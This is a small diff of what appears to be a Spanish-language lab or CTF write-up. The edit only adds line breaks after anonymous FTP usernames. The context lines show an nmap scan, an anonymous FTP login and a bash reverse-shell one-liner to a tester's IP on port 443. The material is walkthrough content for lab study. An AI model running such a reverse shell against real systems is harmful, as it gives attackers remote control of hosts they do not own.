@@ -12,7 +12,7 @@ nmap -sCV -p22,80 172.17.0.2 -oN targeted
 ```bash
 ftp 10.10.44.169
 ```
-Usuario : anonymous 
+Usuario : anonymous <br>
 Passwd : 
 ![image](https://github.com/user-attachments/assets/bb2949af-0f23-4823-a4c4-d56bd78dc1a6)
 
@@ -30,7 +30,7 @@ bash -i >& /dev/tcp/10.21.118.81/443 0>&1
 ```bash
 ftp 10.10.44.169
 ```
-Usuario : anonymous 
+Usuario : anonymous <br>
 Passwd : 
 
 ```bash
